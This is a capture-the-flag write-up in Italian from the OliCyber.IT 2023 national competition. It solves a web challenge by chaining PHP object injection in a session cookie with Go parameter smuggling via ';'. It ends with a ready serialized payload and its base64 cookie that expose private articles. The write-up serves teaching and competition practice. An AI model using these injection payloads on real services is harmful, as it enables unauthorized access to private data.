# OliCyber.IT 2023 - Competizione Nazionale

## [web] Secret Archive (1 risoluzioni)

La challenge espone un servizio php che permette di effettuare delle ricerche su un archivio di articoli, che possono essere privati o publici, il servizio PHP esegue la ricerca inviando richieste HTTP al servizio Golang che detiene l'archivio.

Il servizio Golang mostrerà solo gli articoli pubblici, salvo quando il parametro GET `debug` è settato a `true`, in questo caso verranno mostrati anche gli articoli privati.

### Soluzione

Visitando robots.txt si può notare la presenza di file di backup (.php.bak) e golang (archive/\*). Entrambi contengono il codice sorgente dei servizi.

Il servizio PHP permette di salvare le ricerche effettuate in una variabile di sessione, che viene poi serializzata e salvata in un cookie.

Durante la deserializzazione, il cookie di tipo `History` viene convertito in un oggetto PHP, la classe deserializzata è così definita:

```php
class History
{
   public $searches = array();
}
```

Oltre all'oggetto `History`, è presente anche un oggetto `Searcher` che contiene la stringa di ricerca, i risultati della ricerca e l'oggeto `History`:

```php
class Searcher {
    public $searchTerm;
    public $history;
    public $searchResults;
    ...
```

In particolare è interessante la funzione \_\_wakeup() che viene chiamata durante la deserializzazione:

```php
    function __wakeup(){
        $this->sendAnalytics();
        $this->searchResults = $this->fetchResults();
        $this->savehistory();
    }
```

All'interno di sendAnalytics(), viene fatto un json_encode senza mai controllare json_last_error()

```php
        $analytics = array(
            'search' => $this->searchTerm,
            'history' => $this->history->searches
        );
        $analytics = json_encode($analytics);
```

Mentre in fetchResults, definita così

```php
    function fetchResults() {
        $results = array();
        $client = new GuzzleHttp\Client();
        $src = sanitizeSearchTerm($this->searchTerm);
        $res = $client->request('GET', $golang_url . '?search=' . $src, array(
            'headers' => array(
                'X-Real-IP' => $_SERVER['REAL_IP']
            )
        ));
        $body = $res->getBody();
        $results = json_decode($body, false, 512, JSON_THROW_ON_ERROR);
        // check if json is valid
        if (json_last_error() !== JSON_ERROR_NONE) {
            die('Invalid JSON ' . $body);
        }

        array_push($this->history->searches, $this->searchTerm);

        return $results;
    }
```

Viene effettuata la ricerca dopo aver chiamato la funzione sanitizeSearchTerm(). Da notare che il json_decode ha il flag JSON_THROW_ON_ERROR, che lancia un'eccezione in caso di errore. Rendendo il controllo successivo inutile, e soprattutto permettendo di controllare il valore di json_last_error() tramite la funzione sendAnalytics().

La funzione sanitizeSearchTerm() è definita così:

```php
    if (preg_match('/^[0->a-z]+$/', $searchTerm)) {
        // replace
        $searchTerm = str_replace(':', '', $searchTerm);
        return $searchTerm;
    } else {
        die('Invalid search term');
    }
```

Da notare come i caratteri ; e = siano permessi.

Il servizio golang utilizza la versione 1.16, vulnerabile a [Parameter Smuggling](https://www.oxeye.io/resources/golang-parameter-smuggling-attack/) tramite il carattere `;` che viene visto come un separatore di parametri.

Mettendo insieme la vulnerabilità della versione di `net/url` di golang, con la object injection presente nel cookie di sessione, è possibile aggiungere il parametro `debug=true` alla richiesta HTTP inviata al servizio golang, e quindi visualizzare gli articoli privati.

Si può quindi effettuare una ricerca con il termine `gab;debug=true` e prendere l'articolo privato. Per stampare sulla pagina bisogna forzare un errore nel `json_encode` di sendAnalytics(), che viene chiamato prima di fetchResults(), ad esempio con un valore NAN all'interno dell'array `searches`.

### Exploit

```
O:8:"Searcher":2:{s:10:"searchTerm";s:14:"gab;debug=true";s:7:"history";O:7:"History":1:{s:8:"searches";a:1:{s:3:"key";d:NAN;}}}

ewogICJzZXNzIjogIk86ODpcIlNlYXJjaGVyXCI6Mjp7czoxMDpcInNlYXJjaFRlcm1cIjtzOjE0OlwiZ2FiO2RlYnVnPXRydWVcIjtzOjc6XCJoaXN0b3J5XCI7Tzo3OlwiSGlzdG9yeVwiOjE6e3M6ODpcInNlYXJjaGVzXCI7YToxOntzOjM6XCJrZXlcIjtkOk5BTjt9fX0iCn0=
```
